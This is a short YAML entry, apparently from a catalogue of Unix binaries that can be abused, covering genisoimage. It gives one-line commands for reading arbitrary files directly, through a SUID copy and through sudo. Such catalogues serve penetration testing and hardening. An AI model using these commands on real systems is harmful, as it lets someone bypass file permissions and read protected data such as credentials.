---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        genisoimage -q -o - "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./genisoimage -q -o - "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        genisoimage -q -o - "$LFILE"
---
